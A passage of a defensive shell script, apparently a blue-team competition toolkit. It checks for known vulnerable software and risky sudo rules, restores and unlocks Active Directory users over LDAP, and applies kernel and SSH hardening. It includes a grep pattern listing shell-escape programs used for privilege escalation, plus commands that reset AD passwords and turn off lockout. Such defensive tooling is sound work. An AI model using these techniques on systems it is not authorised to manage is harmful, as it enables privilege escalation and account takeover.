            bug "Log4Shell: $bl_f (log4j $bl_v, CVE-2021-44228)" "one line of text in any logged field (a user name, a header) runs red team's code." \
                "update the app that ships it (2.17.1 or newer), or remove JndiLookup.class from the jar."
        elif vin "$bl_v" 2.15.0 2.16.0; then
            bug "log4j $bl_v at $bl_f is only partly fixed (CVE-2021-45046)" "some settings still allow code to run." "update to log4j 2.17.1 or newer."
        fi
    done
    bl_c=$(find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system /etc/init.d /etc/rc.d /etc/cron.d /etc/cron.daily \
        /etc/cron.hourly /etc/crontab /etc/crontabs /var/spool/cron /usr/local/bin /usr/local/sbin /etc/profile.d -xdev \
        -type f -perm -0002 2>/dev/null | head -10)
    [ -n "$bl_c" ] && bug "files that root runs, but EVERY account can change: $(printf '%s' "$bl_c" | tr '\n' ' ')" \
        "anyone can add a line there, and root runs it on the next boot or cron tick." \
        "chmod o-w <file>, and read each one for lines your team did not add."
    bl_s=$(grep -h -v -E '^[[:space:]]*(#|Defaults|$)' /etc/sudoers /etc/sudoers.d/* 2>/dev/null |
        grep -v -E '^[[:space:]]*(root|%(sudo|wheel|admin))[[:space:]]+ALL' |
        grep -E '(/|[[:space:]])(vim?|nano|less|more|man|find|awk|gawk|perl|python[0-9.]*|ruby|lua|php|bash|sh|env|tar|zip|nmap|git|ftp|cp|mv|tee|dd|chmod|chown|systemctl|journalctl|docker|apt(-get)?|yum|dnf|pip[0-9]*)([[:space:],]|$)' | head -8)
    [ -n "$bl_s" ] && bug "sudo rules that hand out root through a program: $(printf '%s' "$bl_s" | tr '\n' ';')" \
        "these programs can start a shell (GTFOBins), so 'only vim' really means 'root'." \
        "remove the line with visudo -f <file> if your team did not add it. If it is needed, tell your lead."
    for bv_e in exim exim4; do
        have "$bv_e" || continue
        bv_v=$($bv_e -bV 2>/dev/null | sed -n 's/^Exim version \([0-9.]*\).*/\1/p')
        if [ -n "$bv_v" ] && vin "$bv_v" 4.87 4.91; then
            bv_st=$(cve_state CVE-2019-10149 exim4 exim4-daemon-light exim4-daemon-heavy exim)
            [ "$bv_st" != FIXED ] && bug "Exim $bv_v: $bv_st for CVE-2019-10149" "an email to a crafted address runs commands as root." "update exim."
        fi
        break
    done
    if have smbd; then
        bv_v=$(smbd -V 2>/dev/null | sed -n 's/^Version \([0-9.]*\).*/\1/p')
        if [ -n "$bv_v" ] && vin "$bv_v" 3.5.0 4.6.3; then
            bv_st=$(cve_state CVE-2017-7494 samba)
            [ "$bv_st" != FIXED ] && bug "Samba $bv_v: $bv_st for SambaCry (CVE-2017-7494)" "anyone who can write to a share can run code as root." \
                "update Samba, or add 'nt pipe support = no' to [global] until you can."
        fi
    fi
    bv_l=$(openssl version 2>/dev/null | awk '{print $2}')
    case "$bv_l" in 1.0.1|1.0.1[a-f])
        bv_st=$(cve_state CVE-2014-0160 openssl libssl1.0.0 openssl-libs)
        [ "$bv_st" != FIXED ] && bug "OpenSSL $bv_l: $bv_st for Heartbleed (CVE-2014-0160)" "anyone can read server memory: passwords, keys, cookies." "update OpenSSL, restart every service that uses TLS." ;;
    esac
    bl_kd=$(kernel_build_ymd | sed 's/\(....\)\(..\)\(..\)/\1-\2-\3/')
    say "  Kernel: $(uname -r), built ${bl_kd:-on an unknown date (uname -v does not say)}. Older than 2 years? Expect public root exploits for it."
}

chk_bugs() {
    sec bugs "Known bugs: loose settings and old versions red team breaks in with (T1190, T1068)"
    BUGN=0
    bugs_settings
    bugs_versions
    if [ "$BUGN" -gt 0 ]; then
        flag
        nxt "fix what is safe now (settings); for old versions, write it down and ask your lead about updating."
        why "red team scans for exactly these first. A fixed setting is one less way in, and it shows in your incident reports."
    else
        ok "no loose settings or famous old versions found (the full check: menu 15)"
    fi
}

do_bugs() {
    need_root
    {
        say "== Known bugs: the full check (settings, versions, slower searches). Read only."
        say "   For each one: what it is, why red team wants it, and the fix. 'OPEN' = the changelog does not list"
        say "   the fix; 'MAYBE' = this box has no changelog to check (look the version up)."
        BUGN=0
        bugs_settings
        bugs_versions
        bugs_slow
        [ "$BUGN" -eq 0 ] && say "  Nothing found."
        say ""
        say "  How to patch without the internet: apt-get install --only-upgrade <package> (or dnf upgrade <package>)"
        say "  only works if the box's repos are reachable. Ask your lead before upgrading anything that runs a scored service."
        remind "known bugs on $HOST: $BUGN found at $(date '+%H:%M'). Fix or write up the open ones."
    } 2>&1 | tee "$VAULT/bugs_${HOST}_$TS.txt"
    chmod 600 "$VAULT/bugs_${HOST}_$TS.txt"
}

# ---------------------------------------------------------------- domain mode (full)
do_domain() {
    need_root
    say "== Domain check: is the DC (or Kerberos) the real problem?"
    why "a Linux service that logs users in through AD goes red when AD breaks, even if nothing on this box changed."
    say "        Last year the DC fell and took the Linux boxes with it. At Invitational 2, SSH on marvin went red"
    say "        because its computer account was changed in AD, and scored users were deleted on the DC."
    chk_domain
    domain_detect
    if [ -z "$DOM" ] && ! samba_dc_here && ! kdc_here; then
        say "  This box is not joined to a domain: no realm, sssd, winbind or Kerberos settings were found."
        byhand "realm list ; cat /etc/sssd/sssd.conf ; grep default_realm /etc/krb5.conf ; grep -i security /etc/samba/smb.conf"
        say "  If services on OTHER boxes went red at once, the cause may still be the DC: run this on a joined box,"
        say "  or check the users from here: sh first30.sh ad"
        return 0
    fi
    say ""
    say "== More detail"
    say "  DNS servers this box asks: $(awk '/^nameserver/ {printf "%s ", $2}' /etc/resolv.conf 2>/dev/null)"
    why "a box in a domain must ask the DC (or a DNS that knows the domain), or it cannot find the DC at all."
    if [ -n "$DOM" ]; then
        say "  DC records in DNS (_ldap._tcp.dc._msdcs.$DOM):"
        dns_srv "_ldap._tcp.dc._msdcs.$DOM" | sed 's/^/    /'
        for dm_ip in $(domain_dcs); do
            dm_l="  DC $dm_ip ports:"
            for dm_p in 53 88 135 389 445 464 636 3268; do
                tcp_ok "$dm_ip" "$dm_p"
                case $? in 0) dm_l="$dm_l $dm_p:open" ;; 1) dm_l="$dm_l $dm_p:CLOSED" ;; *) dm_l="$dm_l $dm_p:?" ;; esac
            done
            say "$dm_l"
        done
        say "    (53 DNS, 88 Kerberos, 135 RPC, 389 LDAP, 445 SMB, 464 password change, 636 LDAPS, 3268 Global Catalog)"
    fi
    if [ -f /etc/krb5.keytab ] && have klist; then
        say "  computer account keys in /etc/krb5.keytab:"
        klist -k /etc/krb5.keytab 2>/dev/null | awk 'NR > 3 {print "    " $0}' | sort -u | head -6
    fi
    if [ -f /etc/sssd/sssd.conf ]; then
        say "  sssd settings that decide who may log in:"
        grep -E '^[[:space:]]*(access_provider|simple_allow_(users|groups)|ad_gpo_access_control|use_fully_qualified_names|ldap_access_filter|sudo_provider)' /etc/sssd/sssd.conf | sed 's/^/    /'
    fi
    say ""
    say "== Fixes (each one changes something; do them with your lead)"
    say "  Clock off the DC:       chronyc makestep   (or: date -s \"<the DC's time>\")"
    say "  Computer account FAILED (\"Preauthentication failed\"): rejoin, which Invitational 2 needed on marvin:"
    say "      adcli join --ldap-passwd -U <admin> $DOM     (plain realm join fails on Server 2025: \"Message stream modified\")"
    say "      then: systemctl restart sssd"
    say "  sssd stuck offline:     sss_cache -E ; systemctl restart sssd"
    say "  Users deleted, locked or disabled in AD: sh first30.sh ad   (works from this box over LDAPS)"
    say "  Placeholder: <admin> is a domain admin account name (like Administrator)."
}

# ---------------------------------------------------------------- AD rescue over LDAPS
# The Invitational 2 save, made safe for anyone. When the DC had no SSH, no RDP and
# no paste, marvin reached it on port 636 and restored 12 deleted scored users,
# set new passwords, enabled them and turned lockouts off. This does the same, one
# step at a time: it lists first (read only), you pick, it shows the plan, you type
# yes. Passwords are typed hidden and passed through a root-only temporary file,
# never on the command line (where ps would show them to red team).
AD_DC='' AD_URI='' AD_TLS='' AD_BASE='' AD_BIND='' AD_PWF='' AD_FAILS=0
ad_q() {   # ldapsearch with the saved login: ad_q BASE FILTER [attrs...] (extra flags in AD_X)
    ad_qb=$1; ad_qf=$2; shift 2
    # shellcheck disable=SC2086
    LDAPTLS_REQCERT=never tmo ldapsearch -LLL -o ldif-wrap=no -o nettimeout=8 $AD_TLS -H "$AD_URI" -D "$AD_BIND" -y "$AD_PWF" $AD_X -b "$ad_qb" "$ad_qf" "$@"
}
ad_mod() {   # ldapmodify with the saved login; the LDIF comes on stdin
    # shellcheck disable=SC2086
    LDAPTLS_REQCERT=never tmo ldapmodify -c -o nettimeout=8 $AD_TLS -H "$AD_URI" -D "$AD_BIND" -y "$AD_PWF" $AD_X 2>&1
}
ad_records() {   # LDIF on stdin -> "name<TAB>dn<TAB>parent<TAB>changed<TAB>created<TAB>uac" lines
    awk -v RS= '{ dn = ""; sam = "?"; par = ""; ch = ""; cr = ""; uac = ""
        n = split($0, L, "\n")
        for (i = 1; i <= n; i++) {
            if (L[i] ~ /^dn:: /) dn = "B64:" substr(L[i], 6)
            else if (L[i] ~ /^dn: /) dn = substr(L[i], 5)
            else if (L[i] ~ /^sAMAccountName: /) sam = substr(L[i], 17)
            else if (L[i] ~ /^lastKnownParent: /) par = substr(L[i], 18)
            else if (L[i] ~ /^whenChanged: /) ch = substr(L[i], 14, 4) "-" substr(L[i], 18, 2) "-" substr(L[i], 20, 2) " " substr(L[i], 22, 2) ":" substr(L[i], 24, 2)
            else if (L[i] ~ /^whenCreated: /) cr = substr(L[i], 14, 4) "-" substr(L[i], 18, 2) "-" substr(L[i], 20, 2) " " substr(L[i], 22, 2) ":" substr(L[i], 24, 2)
            else if (L[i] ~ /^userAccountControl: /) uac = substr(L[i], 21)
        }
        if (par == "") par = "-"; if (ch == "") ch = "-"; if (cr == "") cr = "-"; if (uac == "") uac = "-"
        if (dn != "") printf "%s\t%s\t%s\t%s\t%s\t%s\n", sam, dn, par, ch, cr, uac }'
}
ad_dn() {   # turn a "B64:..." dn back into text
    case "$1" in B64:*) printf '%s' "${1#B64:}" | base64 -d 2>/dev/null ;; *) printf '%s' "$1" ;; esac
}
ad_pick() {   # ad_pick FILE "what to do": shows the numbered list, sets $AD_SEL to the picked lines
    AD_SEL=''
    [ -s "$1" ] || { say "  None found."; return 1; }
    awk -F'\t' '{printf "  %2d. %-22s changed %s  created %s  %s\n", NR, $1, $4, $5, ($3 != "-" ? "(was in " $3 ")" : "")}' "$1"
    say "  Anything created TODAY or that your team does not know is probably red team's: leave it out."
    ask "Type the numbers to $2 (like 1 3 4), all for every one, or Enter for none:"
    case "$ANS" in
        '') return 1 ;;
        all) AD_SEL=$(cat "$1") ;;
        *) AD_SEL=$(awk -v p=" $ANS " 'index(p, " " NR " ")' "$1") ;;
    esac
    [ -n "$AD_SEL" ] || { say "  Nothing picked."; return 1; }
    say "  Picked: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
}
ad_note_result() {   # summarize ldapmodify output: $1 = what, $2 = output
    ad_ok=$(printf '%s\n' "$2" | grep -c '^modifying entry')
    ad_err=$(printf '%s\n' "$2" | grep -E '^ldap_modify|additional info' | head -6)
    say "  Sent $ad_ok change(s)."
    if [ -n "$ad_err" ]; then
        say "  Errors (look them up with: sh first30.sh why \"<error>\"):"
        say "$ad_err" | sed 's/^/    /'
    else
        say "  No errors."
    fi
}
ad_login() {
    if ! have ldapsearch || ! have ldapmodify; then
        say "  This box has no ldapsearch/ldapmodify. Install them from the box's repos, or use another Linux box:"
        say "    apt-get install ldap-utils    |  dnf install openldap-clients  |  apk add openldap-clients"
        return 1
    fi
    domain_detect
    ad_def=$(domain_dcs 2>/dev/null | head -1)
    ask "Domain controller address${ad_def:+ [Enter = $ad_def]} (example only: 192.168.220.10):"
    AD_DC=${ANS:-$ad_def}
    valid_ip "$AD_DC" || [ -n "$(resolve4 "$AD_DC")" ] || { say "  Not an address I can reach: $AD_DC"; return 1; }
    ask "Domain name${DOM:+ [Enter = $DOM]} (example only: acme.anvil):"
    ad_dom=${ANS:-$DOM}
    [ -n "$ad_dom" ] || { say "  A domain name is needed."; return 1; }
    ask "Admin account [Enter = Administrator]:"
    AD_BIND="${ANS:-Administrator}@$ad_dom"
    AD_TLS=''
    if tcp_ok "$AD_DC" 636; then AD_URI="ldaps://$AD_DC"
    elif tcp_ok "$AD_DC" 389; then
        say "  Port 636 (LDAPS) is closed on the DC. Trying StartTLS on 389 (needs a certificate on the DC)."
        AD_URI="ldap://$AD_DC"; AD_TLS='-ZZ'
    else
        say "  Ports 636 and 389 are both closed or filtered on $AD_DC. Check the DC's firewall, or use another box."
        return 1
    fi
    AD_PWF="$VAULT/.adpw.$$"
    trap 'rm -f "$AD_PWF" "$VAULT/.pkgfiles.$$" "$VAULT/.c2samples.$$" "$VAULT/.ptab.$$" "$VAULT/.stamp_new.$$" "$VAULT/.trace.$$"' 0
    AD_BASE=''
    while [ -z "$AD_BASE" ]; do
        read_secret "Password for $AD_BIND (not shown, not saved):"
        [ -n "$SECRET" ] || { say "  No password typed."; return 1; }
        ( umask 077; printf '%s' "$SECRET" > "$AD_PWF" )
        SECRET=''
        AD_X='-s base'
        ad_t=$(ad_q '' '(objectClass=*)' defaultNamingContext 2>&1)
        AD_X=''
        AD_BASE=$(printf '%s\n' "$ad_t" | sed -n 's/^defaultNamingContext: //p')
        [ -n "$AD_BASE" ] && break
        AD_FAILS=$((AD_FAILS + 1))
        rm -f "$AD_PWF"
        say "  The login failed: $(printf '%s' "$ad_t" | grep -v '^$' | tail -2 | tr '\n' ' ')"
        decode_error "$ad_t" | head -4
        if [ "$AD_FAILS" -ge 2 ]; then
            say "  That is 2 failed tries. STOP here so the account does not lock. Check the password with your team."
            return 1
        fi
        say "  One more try is allowed."
    done
    say "  Logged in to $AD_DC as $AD_BIND over $AD_URI. Domain: $AD_BASE"
    autonote "AD rescue: logged in to $AD_DC as $AD_BIND (LDAP)"
    return 0
}

ad_new_password() {   # asks twice; puts the AD-encoded password in $AD_NPB64
    AD_NPB64=''
    read_secret "New password for the picked users (not shown, not saved anywhere):"
    ad_p1=$SECRET
    read_secret "Type it again:"
    if [ "$ad_p1" != "$SECRET" ] || [ -z "$ad_p1" ]; then ad_p1=''; SECRET=''; say "  They did not match. Nothing changed."; return 1; fi
    if have iconv; then AD_NPB64=$(printf '"%s"' "$ad_p1" | iconv -f UTF-8 -t UTF-16LE 2>/dev/null | base64 | tr -d '\n')
    elif have python3; then AD_NPB64=$(printf '"%s"' "$ad_p1" | python3 -c 'import sys,base64; print(base64.b64encode(sys.stdin.read().encode("utf-16-le")).decode())')
    fi
    ad_p1=''; SECRET=''
    [ -n "$AD_NPB64" ] || { say "  Needs iconv or python3 to encode the password. Nothing changed."; return 1; }
}

do_ad() {
    need_root
    say "== AD rescue over LDAP: restore, enable and unlock domain users, and set passwords"
    why "at Invitational 2 the DC had no SSH, no RDP and no paste. marvin reached it on port 636 and"
    say "        restored 12 deleted scored users. That is what this does, one step at a time."
    say "  Rules this follows: list first, change only what you pick, stop after 2 failed logins,"
    say "  and remind you to file a PCR for every password it sets. Nothing changes until you type yes."
    ad_login || return 1
    while :; do
        say ""
        say "  1  List deleted users (read only)"
        say "  2  List disabled users (read only)"
        say "  3  List locked-out users (read only)"
        say "  4  Restore deleted users you pick          CHANGES AD"
        say "  5  Enable users you pick                   CHANGES AD"
        say "  6  Unlock users you pick                   CHANGES AD"
        say "  7  Set a new password for users you pick   CHANGES AD (then file a PCR)"
        say "  8  Turn off account lockout for the domain CHANGES AD"
        say "  Q  Done"
        ask "Pick one:"
        ad_l="$VAULT/.adlist.$$"
        case "$ANS" in
            1|4)
                AD_X="-E !1.2.840.113556.1.4.417"
                ad_q "CN=Deleted Objects,$AD_BASE" '(&(objectClass=user)(!(objectClass=computer))(isDeleted=TRUE))' sAMAccountName lastKnownParent whenChanged whenCreated 2>/dev/null |
                    ad_records > "$ad_l"
                AD_X=''
                say "  Deleted users ($(grep -c . "$ad_l")). Without the AD Recycle Bin they come back DISABLED with NO password:"
                say "  after restoring, use 7 (password) and then 5 (enable)."
                [ "$ANS" = 4 ] || { awk -F'\t' '{printf "    %-22s deleted %s  (was in %s)\n", $1, $4, $3}' "$ad_l"; rm -f "$ad_l"; continue; }
                ad_pick "$ad_l" "restore" || { rm -f "$ad_l"; continue; }
                say "  Plan: bring these back where they were (or to CN=Users if that place is gone):"
                printf '%s\n' "$AD_SEL" | awk -F'\t' '{print "    " $1 " -> " ($3 != "-" ? $3 : "CN=Users")}'
                if yes_ask "Restore them?"; then
                    ad_out=$(printf '%s\n' "$AD_SEL" | while IFS="$(printf '\t')" read -r an adn apar _ _ _; do
                            adn=$(ad_dn "$adn")
                            acn=$(printf '%s' "$adn" | sed 's/^[Cc][Nn]=//; s/\\0[Aa]DEL:.*//')
                            [ "$apar" != - ] || apar="CN=Users,$AD_BASE"
                            printf 'dn: %s\nchangetype: modify\ndelete: isDeleted\n-\nreplace: distinguishedName\ndistinguishedName: CN=%s,%s\n-\n\n' "$adn" "$acn" "$apar"
                        done | { AD_X="-e !1.2.840.113556.1.4.417"; ad_mod; })
                    ad_note_result restore "$ad_out"
                    autonote "AD rescue: restored deleted users: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
                    fact "restored deleted domain users: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
                    remind "restored AD users on $AD_DC: set their passwords (choice 7), enable them (5), and file PCRs"
                fi ;;
            2|5)
                ad_q "$AD_BASE" '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' sAMAccountName whenChanged whenCreated userAccountControl 2>/dev/null |
                    ad_records | grep -v -i -E '^(krbtgt|guest|defaultaccount|wdagutilityaccount)[[:space:]]' > "$ad_l"
                say "  Disabled users ($(grep -c . "$ad_l")):"
                [ "$ANS" = 5 ] || { awk -F'\t' '{printf "    %-22s changed %s  created %s\n", $1, $4, $5}' "$ad_l"; rm -f "$ad_l"; continue; }
                ad_pick "$ad_l" "enable" || { rm -f "$ad_l"; continue; }
                if yes_ask "Enable these accounts?"; then
                    ad_out=$(printf '%s\n' "$AD_SEL" | while IFS="$(printf '\t')" read -r an adn _ _ _ auac; do
                            adn=$(ad_dn "$adn")
                            case "$auac" in ''|*[!0-9]*) auac=514 ;; esac
                            anew=$(( auac - (auac / 2 % 2) * 2 ))
                            printf 'dn: %s\nchangetype: modify\nreplace: userAccountControl\nuserAccountControl: %s\n-\n\n' "$adn" "$anew"
                        done | ad_mod)
                    ad_note_result enable "$ad_out"
                    printf '%s\n' "$ad_out" | grep -q -i 'unwilling\|constraint' && say "  'Unwilling' or 'constraint' here usually means the account has no password yet: use 7 first."
                    autonote "AD rescue: enabled users: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
                    fact "enabled domain users: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
                fi ;;
            3|6)
                ad_q "$AD_BASE" '(&(objectCategory=person)(objectClass=user)(lockoutTime>=1))' sAMAccountName whenChanged whenCreated 2>/dev/null |
                    ad_records > "$ad_l"
                say "  Locked-out users ($(grep -c . "$ad_l")). Many at once = password guessing, or red team locking scored users:"
                [ "$ANS" = 6 ] || { awk -F'\t' '{printf "    %-22s changed %s\n", $1, $4}' "$ad_l"; rm -f "$ad_l"; continue; }
                ad_pick "$ad_l" "unlock" || { rm -f "$ad_l"; continue; }
                if yes_ask "Unlock these accounts?"; then
                    ad_out=$(printf '%s\n' "$AD_SEL" | while IFS="$(printf '\t')" read -r an adn _; do
                            printf 'dn: %s\nchangetype: modify\nreplace: lockoutTime\nlockoutTime: 0\n-\n\n' "$(ad_dn "$adn")"
                        done | ad_mod)
                    ad_note_result unlock "$ad_out"
                    autonote "AD rescue: unlocked users: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
                    fact "unlocked domain users: $(printf '%s\n' "$AD_SEL" | cut -f1 | tr '\n' ' ')"
                    say "  Find who was guessing: the DC's failed logins (events 4625/4771), or the hunt on each box."
                fi ;;
            7)
                ask "Type the account names to set (like dduck mmouse), separated by spaces:"
                [ -n "$ANS" ] || continue
                : > "$ad_l"
                for an in $ANS; do
                    ad_q "$AD_BASE" "(&(objectCategory=person)(sAMAccountName=$an))" sAMAccountName whenChanged whenCreated userAccountControl 2>/dev/null | ad_records >> "$ad_l"
                done
                [ -s "$ad_l" ] || { say "  None of those names were found (deleted ones must be restored first: choice 4)."; rm -f "$ad_l"; continue; }
                AD_SEL=$(cat "$ad_l")
                say "  Found: $(cut -f1 "$ad_l" | tr '\n' ' ')"
                say "  Scored users: the scoring engine logs in with these passwords. Use the password your PCR will say."
                ad_new_password || { rm -f "$ad_l"; continue; }
                if yes_ask "Set this password for: $(cut -f1 "$ad_l" | tr '\n' ' ')?"; then
                    ad_out=$(printf '%s\n' "$AD_SEL" | while IFS="$(printf '\t')" read -r an adn _; do
                            printf 'dn: %s\nchangetype: modify\nreplace: unicodePwd\nunicodePwd:: %s\n-\n\n' "$(ad_dn "$adn")" "$AD_NPB64"
                        done | ad_mod)
                    ad_note_result password "$ad_out"
                    ad_names=$(cut -f1 "$ad_l" | tr '\n' ' ')
                    autonote "AD rescue: set new passwords for: $ad_names (PCR needed)"
                    fact "set new passwords for domain users: $ad_names"
                    remind "FILE A PCR on the scoring site for: $ad_names (passwords set at $(date '+%H:%M'))"
                    say "  NOW: file the PCR on the scoring site for: $ad_names"
                    say "  Apps that log in to AD as one of these accounts (SSO, wiki, mail) need the new password too."
                fi
                AD_NPB64='' ;;
            8)
                AD_X='-s base'
                ad_cur=$(ad_q "$AD_BASE" '(objectClass=domain)' lockoutThreshold 2>/dev/null | sed -n 's/^lockoutThreshold: //p')
                AD_X=''
                say "  Lockout now: an account locks after ${ad_cur:-?} wrong passwords (0 = never)."
                why "red team locks scored users on purpose by guessing wrong. 0 stops that, but allows unlimited guessing,"
                say "        so every password must be strong. The Default Domain Policy can put the old value back later."
                if yes_ask "Set lockout to 0 (never lock)?"; then
                    ad_out=$(printf 'dn: %s\nchangetype: modify\nreplace: lockoutThreshold\nlockoutThreshold: 0\n-\n' "$AD_BASE" | ad_mod)
                    ad_note_result lockout "$ad_out"
                    autonote "AD rescue: domain lockout threshold set to 0 (was ${ad_cur:-?})"
                fi ;;
            [Qq]|'') rm -f "$ad_l" "$AD_PWF"; break ;;
            *) say "  Pick 1-8 or Q." ;;
        esac
        rm -f "$ad_l"
    done
    rm -f "$AD_PWF"
    say "Done. Every change is in the team notes. Open reminders (PCRs): $(reminders_count)"
}

# ---------------------------------------------------------------- harden (one step at a time, with undo)
# Real hardening from the CIS benchmarks and the kernel's own docs, picked so it
# does not break scored services. Each step says what it does, why, and the risk,
# then asks. Everything it changes is saved so undo-harden puts it back.
HUNDO="$VAULT/harden_undo.txt"
hu_add() { printf '%s\n' "$*" >> "$HUNDO"; chmod 600 "$HUNDO"; }
h_step() {   # h_step NUMBER TITLE
    say ""
    say "---- [$1/10] $2"
}
HARDEN_SYSCTL='kernel.kptr_restrict 2 hides kernel memory addresses that root exploits need
kernel.dmesg_restrict 1 only root can read the kernel log
kernel.yama.ptrace_scope 1 a program may only trace its own children (stops strace -p stealing passwords from other programs)
fs.protected_symlinks 1 blocks symlink tricks in /tmp
fs.protected_hardlinks 1 blocks hard-link tricks
fs.protected_fifos 1 blocks FIFO tricks in shared folders
fs.protected_regular 1 blocks file tricks in shared folders
fs.suid_dumpable 0 SUID programs never write their memory (with passwords) to disk
net.ipv4.tcp_syncookies 1 keeps answering during a SYN flood
net.ipv4.conf.all.accept_redirects 0 ignores ICMP redirects (a way to hijack traffic)
net.ipv4.conf.default.accept_redirects 0 the same, for new network cards
net.ipv4.conf.all.secure_redirects 0 the same, for "secure" redirects
net.ipv6.conf.all.accept_redirects 0 the same, for IPv6
net.ipv4.conf.all.accept_source_route 0 ignores packets that pick their own route
net.ipv4.icmp_echo_ignore_broadcasts 1 does not answer broadcast pings (amplification)
net.ipv4.conf.all.log_martians 1 logs packets with impossible addresses (spoofing)'

h_sysctl_set() {   # h_sysctl_set KEY VALUE -> 0 if changed
    hs_p=/proc/sys/$(printf '%s' "$1" | tr . /)
    [ -f "$hs_p" ] || return 1
    hs_c=$(cat "$hs_p" 2>/dev/null)
    [ "$hs_c" = "$2" ] && return 1
    if ! { printf '%s\n' "$2" > "$hs_p"; } 2>/dev/null; then say "    $1: this box does not allow changing it (left at $hs_c)"; return 1; fi
    hu_add "sysctl $1 $hs_c"
    say "    $1: $hs_c -> $2"
    return 0
}

h_kernel() {
    h_step 1 "Kernel safety settings (runtime only; a reboot puts the old values back)"
    why "these close tricks that exploits and backdoors use. None of them stops a normal service."
    say "  Settings that would change:"
    printf '%s\n' "$HARDEN_SYSCTL" | while read -r hk_k hk_v hk_d; do
        hk_p=/proc/sys/$(printf '%s' "$hk_k" | tr . /)
        [ -f "$hk_p" ] && [ "$(cat "$hk_p" 2>/dev/null)" != "$hk_v" ] && say "    $hk_k -> $hk_v   ($hk_d)"
    done
    [ "$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)" = 0 ] && say "    kernel.unprivileged_bpf_disabled -> 2   (only root may load eBPF programs: BPF backdoors)"
    if [ "$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)" = 0 ]; then
        [ "$(cat /proc/sys/net/ipv4/conf/all/send_redirects 2>/dev/null)" = 1 ] && say "    net.ipv4.conf.all.send_redirects -> 0   (this box is not a router)"
    fi
    yes_ask "Apply these?" || return 0
    printf '%s\n' "$HARDEN_SYSCTL" | while read -r hk_k hk_v _; do h_sysctl_set "$hk_k" "$hk_v"; done
    [ "$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)" = 0 ] && h_sysctl_set kernel.unprivileged_bpf_disabled 2
    [ "$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null)" = 0 ] && h_sysctl_set net.ipv4.conf.all.send_redirects 0
    autonote "harden: kernel safety settings (sysctl, runtime)"
    byhand "sysctl kernel.yama.ptrace_scope   (read one)   ;   sysctl -w kernel.yama.ptrace_scope=1   (set one)"
}

h_persist() {
    h_step 2 "Keep those kernel settings after a reboot"
    hp_set=$(awk '$1 == "sysctl" {print $2}' "$HUNDO" 2>/dev/null | sort -u)
    [ -n "$hp_set" ] || { say "  Nothing to keep (step 1 changed nothing)."; return 0; }
    if [ -d /etc/sysctl.d ]; then hp_f=/etc/sysctl.d/99-first30.conf; else hp_f=''; fi
    [ -n "$hp_f" ] || { say "  This box has no /etc/sysctl.d. Add them to /etc/sysctl.conf by hand if you want them kept."; return 0; }
    why "red team can reboot the box; without this the settings from step 1 are gone after it."
    yes_ask "Write $hp_f?" || return 0
    { say "# written by first30 harden $(now_utc); undo: sh first30.sh undo-harden"
      for hp_k in $hp_set; do say "$hp_k = $(cat "/proc/sys/$(printf '%s' "$hp_k" | tr . /)")"; done; } > "$hp_f"
    hu_add "file $hp_f"
    say "  Wrote $hp_f"
    autonote "harden: kernel settings kept in $hp_f"
}

H_SSH='MaxAuthTries 4
PermitEmptyPasswords no
PermitUserEnvironment no
HostbasedAuthentication no
IgnoreRhosts yes
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
GatewayPorts no
PermitTunnel no
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2
MaxStartups 10:30:60
LogLevel VERBOSE'
h_ssh() {
    h_step 3 "SSH server settings (it keeps password and key logins as they are)"
    hs_cfg=$(find_cfg) || { say "  No sshd here. Skipping."; return 0; }
    hs_bin=$(find_sshd) || { say "  No sshd program found. Skipping."; return 0; }
    say "  Would set:"
    printf '%s\n' "$H_SSH" | sed 's/^/    /'
    why "no tunnels or forwarding (red team pivots through SSH), fewer guesses per connection, idle sessions"
    say "        dropped, and LogLevel VERBOSE logs WHICH key logged in (proof for your incident reports)."
    say "  Risk: if your team uses ssh -L / -D tunnels, AllowTcpForwarding no stops them. Logins are not touched."
    yes_ask "Apply the SSH settings?" || return 0
    if grep -q -i -E '^[[:space:]]*Include[[:space:]].*sshd_config\.d' "$hs_cfg" && [ -d "$(dirname "$hs_cfg")/sshd_config.d" ]; then
        hs_f="$(dirname "$hs_cfg")/sshd_config.d/00-first30-harden.conf"
        { say "# first30 harden $(now_utc). Files here are read in name order and the FIRST value wins,"
          say "# so 00- beats a planted zz-backdoor.conf. Undo: sh first30.sh undo-harden"
          printf '%s\n' "$H_SSH"; } > "$hs_f"
        chmod 600 "$hs_f"
        hu_add "file $hs_f"
    else
        hs_f=$hs_cfg
        cp -p "$hs_cfg" "$VAULT/sshd_config.before_harden_$TS"
        { say "# first30 harden start"; printf '%s\n' "$H_SSH"; say "# first30 harden end"; cat "$hs_cfg"; } > "$hs_cfg.f30.$$" &&
            cat "$hs_cfg.f30.$$" > "$hs_cfg" && rm -f "$hs_cfg.f30.$$"
        hu_add "sshblock $hs_cfg"
    fi
    if ! hs_t=$("$hs_bin" -t -f "$hs_cfg" 2>&1); then
        say "  sshd -t found an error, so the change was taken back:"
        say "$hs_t" | sed 's/^/    /'
        h_undo_last
        return 0
    fi
    # which settings really took effect (sshd uses the FIRST value it reads for each one)
    printf '%s\n' "$H_SSH" | awk '{print tolower($1), tolower($2)}' > "$VAULT/.hs.$$"
    hs_miss=$("$hs_bin" -T -f "$hs_cfg" 2>/dev/null | awk 'NR == FNR {w[$1] = $2; next} {k = tolower($1)} (k in w) && tolower($2) != w[k] {print $1 " is " $2}' "$VAULT/.hs.$$" -)
    rm -f "$VAULT/.hs.$$"
    reload_sshd
    say "  Done. Open a NEW SSH session to test before you close this one."
    [ -n "$hs_miss" ] && say "  Not in effect (set earlier in sshd_config, which wins): $(printf '%s' "$hs_miss" | tr '\n' ';')"
    autonote "harden: SSH settings (no forwarding/tunnels, MaxAuthTries 4, LogLevel VERBOSE) in $hs_f"
